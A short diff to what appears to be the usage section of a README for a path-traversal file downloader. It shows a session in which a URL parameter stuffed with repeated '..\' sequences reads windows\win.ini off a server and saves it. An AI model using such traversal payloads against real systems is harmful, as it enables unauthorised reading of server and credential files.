@@ -7,7 +7,11 @@ example usage
 ==========
 
 Please enter the base url you want to start in: http://example.com/downloadfile.php?fn=..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\
+
 filepath~> windows\win.ini
+
 Content Length: 92
+
 Saved file to windows-win.ini
+
 filepath~>
